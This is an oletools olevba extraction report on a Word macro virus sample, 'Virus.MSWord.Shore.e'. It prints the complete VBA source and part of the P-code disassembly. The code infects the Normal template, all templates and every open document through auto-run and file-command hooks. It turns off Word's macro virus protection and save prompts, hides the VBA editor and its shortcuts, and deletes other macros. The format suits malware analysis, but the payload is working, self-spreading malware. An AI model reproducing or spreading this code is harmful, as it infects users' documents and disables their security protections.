olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shore.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shore.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Offee.bas 
in file: Virus.MSWord.Shore.e - OLE stream: 'Macros/VBA/Offee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Const SeriesNumber = 990907
Public Const ModuleName = "Offee", mw = "Microsoft Word", _
        SerNum$ = "Series Number", _
        pass = "Password : ", _
        scrollCap = "Normal." & ModuleName & ".scrollCaption"

Public anCap As String, anInt As Single, anPos As Integer, Animated As Boolean, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog

'procedures in Offe module
Sub buggy()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub


Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value = SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function

Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
    
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function

Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.codemodule
                .deletelines 1, .countoflines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub

Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
End Sub

Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next
    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="xxxx", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        On Error Resume Next
        theDestination.Save True
    End If
End Sub

Sub Copy2Normal()
Dim ATemp As Template
    Stealth
    If Documents.Count > 0 Then
        Infecting activeDocument, NormalTemplate
        If activeDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting activeDocument, activeDocument.AttachedTemplate
        For Each ATemp In Templates
            Infecting activeDocument, ATemp
        Next ATemp
    End If
    
    With NormalTemplate.VBProject.VBComponents(1).codemodule
        .deletelines 1, .countoflines
    End With
End Sub

Sub Copy2Document()
Dim aDoc As Document
    Stealth
    For Each aDoc In Documents
        Infecting NormalTemplate, aDoc
        On Error Resume Next
        WordBasic.viewpage
    Next aDoc
    If Documents.Count > 0 Then _
    If activeDocument.AttachedTemplate <> NormalTemplate Then _
        Infecting NormalTemplate, activeDocument.AttachedTemplate
End Sub

Sub Jump2Normal(macName As String)
    Application.Run "normal." & ModuleName & "." & macName
End Sub

'infection procedures
Sub AutoOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    
    If getModuleExist(NormalTemplate) Then
        Jump2Normal ("Copy2Document")
        If Documents.Count > 0 Then
            On Error Resume Next
            activeDocument.Save
        End If
    Else
        Copy2Normal
        On Error Resume Next
        NormalTemplate.Save
    End If
End Sub

Sub FileOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    AnimateCaption
    
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        AutoOpen
        On Error Resume Next
        activeDocument.Saved = True
        activeDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoClose()
    AnimateCaption
    Stealth
    On Error Resume Next
'    AutoOpen
    Copy2Document
    If Not activeDocument.Saved And activeDocument.Characters.Count > 0 Then activeDocument.Save
    activeDocument.Saved = True
    ModifyAttr activeDocument.FullName
End Sub

Sub FileClose()
Dim afn As String
    AnimateCaption
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    AutoClose
    afn = activeDocument.FullName
    activeDocument.Close
    ModifyAttr afn
    WordBasic.DisableAutoMacros False
End Sub

Sub FileSave()
    AnimateCaption
    WordBasic.DisableAutoMacros True
    
    Copy2Document
    On Error Resume Next
    With activeDocument
        .Save
        .Saved = True
    End With
    WordBasic.DisableAutoMacros False
End Sub



Sub InitDialog()
    Stealth
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
    
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
    
    
Sub AutoExec()
Dim Combar As CommandBar
    WordBasic.DisableAutoMacros True
    InitDialog
    Animated = False
    AnimateCaption
    Copy2Normal
    If getInfected(NormalTemplate) Then Copy2Document
    ModifyAttr NormalTemplate.FullName
    buggy
    For Each Combar In Application.CommandBars
    Next Combar
End Sub

Sub AutoExit()
    AutoOpen
    AnimateCaption
    ModifyAttr NormalTemplate.FullName
End Sub

Sub fileNewDefault()
    AnimateCaption
    WordBasic.fileNewDefault
    Copy2Document
End Sub

Sub FileNew()
    If Dialogs(wdDialogFileNew).Show <> 0 Then
        AnimateCaption
        Copy2Document
    End If
End Sub

Sub Stealth()
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
End Sub

Sub NoStealth()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
End Sub

Sub ToolsOptions()
    InitDialog
    NoStealth
    On Error Resume Next
    ToolsOptionsDlg.Display
    AnimateCaption
    Stealth
End Sub


Sub NoAccess()
    a = MsgBox(msg, vbExclamation, abadacc)
    AnimateCaption
End Sub

Function passDialog() As Boolean
Dim cruel As String
    passDialog = False
    cruel = ccc + Mid(code, 9, 2)
    If LCase(InputBox(pass, badboy)) = cruel Then
        passDialog = True
    Else
        NoAccess
    End If
End Function


Sub ToolsMacro()
    InitDialog
    ToolsMacrosDlg.Display
    AnimateCaption
End Sub


Sub FileTemplates()
    InitDialog
    ToolsTemplatesDlg.Display
'    CustomizationContext = NormalTemplate
    AnimateCaption
End Sub

Sub viewvbcode()
    Application.ShowVisualBasicEditor = passDialog
End Sub

Sub viewcode()
    viewvbcode
End Sub

Sub Organizer()
    InitDialog
    OrganizerDlg.Display
    AnimateCaption
End Sub

Sub FormatStyle()
    InitDialog
    With FormatStyleDlg
        .Display
        .Execute
    End With
    AnimateCaption
End Sub


Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub

Sub AnimateCaption()
    On Error Resume Next
    WordBasic.viewpage
    If Animated Then Exit Sub
    anIntv = 0.5
    anPos = 0
    anCap = OFC
    Application.OnTime Now + TimeSerial(0, 0, 3), scrollCap
    Animated = True
End Sub


Sub ScrollCaption()
    If Animated Then
        Application.Caption = Right$(anCap, anPos)
        Application.OnTime Now + TimeSerial(0, 0, anIntv), scrollCap
        anPos = anPos + 1
    End If
    
    If anPos > Len(anCap) Then
        On Error Resume Next
        WordBasic.viewpage
        
        anPos = 0
        If anCap = OFC Then
            anCap = Peace
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = Peace Then
            anCap = mw
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = mw Then
            anCap = OFC
            Application.OnTime Now + TimeSerial(0, 0, 1200), scrollCap
            Animated = False
        End If
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Shore.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1280 bytes
' Macros/VBA/Offee - 27898 bytes
' Line #0:
' 	Dim (Public Const) 
' 	LitDI4 0x1EBB 0x000F 
' 	VarDefn SeriesNumber
' Line #1:
' 	LineCont 0x000C 0A 00 08 00 0E 00 08 00 12 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x0005 "Offee"
' 	VarDefn ModuleName
' 	LitStr 0x000E "Microsoft Word"
' 	VarDefn mw
' 	LitStr 0x000D "Series Number"
' 	VarDefn SerNum
' 	LitStr 0x000B "Password : "
' 	VarDefn pass
' 	LitStr 0x0007 "Normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x000E ".scrollCaption"
' 	Concat 
' 	VarDefn scrollCap
' Line #2:
' Line #3:
' 	LineCont 0x0014 11 00 08 00 15 00 08 00 19 00 08 00 1D 00 08 00 21 00 08 00
' 	Dim (Public) 
' 	VarDefn anCap (As String)
' 	VarDefn anInt (As Single)
' 	VarDefn anPos (As Integer)
' 	VarDefn Animated (As Boolean)
' 	VarDefn ToolsOptionsDlg
' 	VarDefn OrganizerDlg
' 	VarDefn ToolsTemplatesDlg
' 	VarDefn ToolsMacrosDlg
' 	VarDefn FormatStyleDlg
' Line #4:
' Line #5:
' 	QuoteRem 0x0000 0x0019 "procedures in Offe module"
' Line #6:
' 	FuncDefn (Sub buggy())
' Line #7:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #8:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #9:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #10:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' Line #12:
' 	LineCont 0x0010 05 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #13:
' 	EndSub 
' Line #14:
' Line #15:
' Line #16:
' 	FuncDefn (Function getDocPropExist(theObject As Object) As Boolean)
' Line #17:
' 	Dim 
' 	VarDefn adp (As DocumentProperty)
' Line #18:
' 	LitVarSpecial (False)
' 	St getDocPropExist 
' Line #19:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #20:
' 	StartWithExpr 
' 	Ld adp 
' 	With 
' Line #21:
' 	LineCont 0x0004 0B 00 0C 00
' 	MemLdWith New 
' 	Ld SerNum$ 
' 	Eq 
' 	MemLdWith TypeOf 
' 	Ld msoPropertyTypeNumber 
' 	Eq 
' 	And 
' 	MemLdWith Value 
' 	Ld SeriesNumber 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #22:
' 	LitVarSpecial (True)
' 	St getDocPropExist 
' Line #23:
' 	ExitFunc 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndWith 
' Line #26:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	EndFunc 
' Line #28:
' Line #29:
' 	FuncDefn (Function getModuleExist(theObject As Object) As Boolean)
' Line #30:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #31:
' 	LitVarSpecial (False)
' 	St getModuleExist 
' Line #32:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #33:
' 	Ld anObject 
' 	MemLd New 
' 	Ld ModuleName 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitVarSpecial (True)
' 	St getModuleExist 
' Line #35:
' 	ExitFunc 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	EndFunc 
' Line #39:
' Line #40:
' 	FuncDefn (Function getInfected(theObject As Object) As Boolean)
' Line #41:
' 	Ld theObject 
' 	ArgsLd getModuleExist 0x0001 
' 	Ld theObject 
' 	ArgsLd getDocPropExist 0x0001 
' 	And 
' 	St getInfected 
' Line #42:
' 	EndFunc 
' Line #43:
' Line #44:
' 	FuncDefn (Sub clearMacros(theObject As Object))
' Line #45:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #46:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #47:
' 	Ld anObject 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #48:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld theObject 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld anObject 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #49:
' 	ElseBlock 
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	StartWithExpr 
' 	Ld anObject 
' 	MemLd codemodule 
' 	With 
' Line #52:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #53:
' 	EndWith 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' Line #57:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #58:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #59:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' 	FuncDefn (Sub copyMacros(theSource As Object, theDestination As Object))
' Line #63:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #64:
' 	LineCont 0x0014 07 00 08 00 0C 00 0C 00 10 00 0C 00 14 00 0C 00 18 00 0C 00
' 	Ld theDestination 
' 	ArgsLd getDocPropExist 0x0001 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld theDestination 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' 	EndIf 
' Line #65:
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld theSource 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #68:
' 	EndSub 
' Line #69:
' Line #70:
' 	FuncDefn (Sub Infecting(theSource As Object, theDestination As Object))
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	Ld theDestination 
' 	ArgsLd getInfected 0x0001 
' 	Not 
' 	IfBlock 
' Line #73:
' 	LineCont 0x000C 03 00 0C 00 09 00 0C 00 11 00 0C 00
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	LitStr 0x0004 "xxxx"
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #74:
' 	Ld theDestination 
' 	ArgsCall clearMacros 0x0001 
' Line #75:
' 	Ld theSource 
' 	Ld theDestination 
' 	ArgsCall copyMacros 0x0002 
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	LitVarSpecial (True)
' 	Ld theDestination 
' 	ArgsMemCall Save 0x0001 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	EndSub 
' Line #80:
' Line #81:
' 	FuncDefn (Sub Copy2Normal())
' Line #82:
' 	Dim 
' 	VarDefn ATemp (As Template)
' Line #83:
' 	ArgsCall Stealth 0x0000 
' Line #84:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #85:
' 	Ld activeDocument 
' 	Ld NormalTemplate 
' 	ArgsCall Infecting 0x0002 
' Line #86:
' 	LineCont 0x0004 07 00 0C 00
' 	Ld activeDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld activeDocument 
' 	Ld activeDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' Line #87:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #88:
' 	Ld activeDocument 
' 	Ld ATemp 
' 	ArgsCall Infecting 0x0002 
' Line #89:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' 	EndIfBlock 
' Line #91:
' Line #92:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #93:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #94:
' 	EndWith 
' Line #95:
' 	EndSub 
' Line #96:
' Line #97:
' 	FuncDefn (Sub Copy2Document())
' Line #98:
' 	Dim 
' 	VarDefn aDoc (As Document)
' Line #99:
' 	ArgsCall Stealth 0x0000 
' Line #100:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #101:
' 	Ld NormalTemplate 
' 	Ld aDoc 
' 	ArgsCall Infecting 0x0002 
' Line #102:
' 	OnError (Resume Next) 
' Line #103:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #104:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	LineCont 0x0008 07 00 04 00 0E 00 08 00
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld activeDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	Ld activeDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' 	EndIf 
' Line #106:
' 	EndSub 
' Line #107:
' Line #108:
' 	FuncDefn (Sub Jump2Normal(macName As String))
' Line #109:
' 	LitStr 0x0007 "normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld macName 
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x0014 "infection procedures"
' Line #113:
' 	FuncDefn (Sub AutoOpen())
' Line #114:
' 	ArgsCall Stealth 0x0000 
' Line #115:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #116:
' Line #117:
' 	Ld NormalTemplate 
' 	ArgsLd getModuleExist 0x0001 
' 	IfBlock 
' Line #118:
' 	LitStr 0x000D "Copy2Document"
' 	Paren 
' 	ArgsCall Jump2Normal 0x0001 
' Line #119:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #120:
' 	OnError (Resume Next) 
' Line #121:
' 	Ld activeDocument 
' 	ArgsMemCall Save 0x0000 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	ElseBlock 
' Line #124:
' 	ArgsCall Copy2Normal 0x0000 
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	EndSub 
' Line #129:
' Line #130:
' 	FuncDefn (Sub FileOpen())
' Line #131:
' 	ArgsCall Stealth 0x0000 
' Line #132:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #133:
' 	ArgsCall AnimateCaption 0x0000 
' Line #134:
' Line #135:
' 	OnError (Resume Next) 
' Line #136:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #137:
' 	ArgsCall AutoOpen 0x0000 
' Line #138:
' 	OnError (Resume Next) 
' Line #139:
' 	LitVarSpecial (True)
' 	Ld activeDocument 
' 	MemSt Saved 
' Line #140:
' 	Ld activeDocument 
' 	ArgsMemCall Save 0x0000 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #143:
' 	EndSub 
' Line #144:
' Line #145:
' 	FuncDefn (Sub AutoClose())
' Line #146:
' 	ArgsCall AnimateCaption 0x0000 
' Line #147:
' 	ArgsCall Stealth 0x0000 
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	QuoteRem 0x0000 0x000C "    AutoOpen"
' Line #150:
' 	ArgsCall Copy2Document 0x0000 
' Line #151:
' 	Ld activeDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld activeDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld activeDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #152:
' 	LitVarSpecial (True)
' 	Ld activeDocument 
' 	MemSt Saved 
' Line #153:
' 	Ld activeDocument 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #154:
' 	EndSub 
' Line #155:
' Line #156:
' 	FuncDefn (Sub FileClose())
' Line #157:
' 	Dim 
' 	VarDefn afn (As String)
' Line #158:
' 	ArgsCall AnimateCaption 0x0000 
' Line #159:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #160:
' 	OnError (Resume Next) 
' Line #161:
' 	ArgsCall AutoClose 0x0000 
' Line #162:
' 	Ld activeDocument 
' 	MemLd FullName 
' 	St afn 
' Line #163:
' 	Ld activeDocument 
' 	ArgsMemCall Close 0x0000 
' Line #164:
' 	Ld afn 
' 	ArgsCall ModifyAttr 0x0001 
' Line #165:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #166:
' 	EndSub 
' Line #167:
' Line #168:
' 	FuncDefn (Sub FileSave())
' Line #169:
' 	ArgsCall AnimateCaption 0x0000 
' Line #170:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #171:
' Line #172:
' 	ArgsCall Copy2Document 0x0000 
' Line #173:
' 	OnError (Resume Next) 
' Line #174:
' 	StartWithExpr 
' 	Ld activeDocument 
' 	With 
' Line #175:
' 	ArgsMemCallWith Save 0x0000 
' Line #176:
' 	LitVarSpecial (True)
' 	MemStWith Saved 
' Line #177:
' 	EndWith 
' Line #178:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #179:
' 	EndSub 
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' 	FuncDefn (Sub InitDialog())
' Line #184:
' 	ArgsCall Stealth 0x0000 
' Line #185:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #186:
' 	OnError (Resume Next) 
' Line #187:
' 	SetStmt 
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsOptionsDlg 
' Line #188:
' 	SetStmt 
' 	Ld wdDialogOrganizer 
' 	ArgsLd Dialogs 0x0001 
' 	Set OrganizerDlg 
' Line #189:
' 	SetStmt 
' 	Ld wdDialogToolsTemplates 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsTemplatesDlg 
' Line #190:
' 	SetStmt 
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsMacrosDlg 
' Line #191:
' 	SetStmt 
' 	Ld wdDialogFormatStyle 
' 	ArgsLd Dialogs 0x0001 
' 	Set FormatStyleDlg 
' Line #192:
' Line #193:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #194:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #195:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #196:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #197:
' 	OnError (Resume Next) 
' Line #198:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #199:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #200:
' 	EndSub 
' Line #201:
' Line #202:
' Line #203:
' 	FuncDefn (Sub AutoExec())
' Line #204:
' 	Dim 
' 	VarDefn Combar (As CommandBar)
' Line #205:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #206:
' 	ArgsCall InitDialog 0x0000 
' Line #207:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #208:
' 	ArgsCall AnimateCaption 0x0000 
' Line #209:
' 	ArgsCall Copy2Normal 0x0000 
' Line #210:
' 	Ld NormalTemplate 
' 	ArgsLd getInfected 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Copy2Document 0x0000 
' 	EndIf 
' Line #211:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #212:
' 	ArgsCall buggy 0x0000 
' Line #213:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ForEach 
' Line #214:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	NextVar 
' Line #215:
' 	EndSub 
' Line #216:
' Line #217:
' 	FuncDefn (Sub AutoExit())
' Line #218:
' 	ArgsCall AutoOpen 0x0000 
' Line #219:
' 	ArgsCall AnimateCaption 0x0000 
' Line #220:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #221:
' 	EndSub 
' Line #222:
' Line #223:
' 	FuncDefn (Sub fileNewDefault())
' Line #224:
' 	ArgsCall AnimateCaption 0x0000 
' Line #225:
' 	Ld WordBasic 
' 	ArgsMemCall fileNewDefault 0x0000 
' Line #226:
' 	ArgsCall Copy2Document 0x0000 
' Line #227:
' 	EndSub 
' Line #228:
' Line #229:
